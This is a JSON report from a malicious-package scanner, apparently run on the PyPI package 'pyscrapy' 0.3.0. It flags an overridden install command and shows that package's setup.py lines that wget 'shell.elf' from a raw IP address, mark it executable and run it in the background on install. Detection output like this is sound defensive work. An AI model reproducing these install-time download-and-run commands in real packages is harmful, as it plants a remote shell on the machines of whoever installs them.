@@ -1,0 +1,46 @@
+{
+    "issues": 5,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:28",
+                "code": "setuptools.setup(\n    name=\"pyscrapy\",\n    version=\"0.3.0\",\n    url=\"http://pypi.python.org/pypi/pyscrapy/\",\n\n    author=\"pyscrapy\",\n    author_email=\"Avikalp@example.com\",\n\n    description=\"Useful pyscrapy.\",\n    long_description=open('REA...\n    ],\n)\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "setup.py:15",
+                "code": "        os.system('wget http://39.108.192.78:81/shell.elf')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:16",
+                "code": "        os.system('chmod +x ./shell.elf')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:18",
+                "code": "        os.system('./shell.elf &')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "setup.py:15",
+                "code": "        os.system('wget http://39.108.192.78:81/shell.elf')\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/pyscrapy-0.3.0"
+}
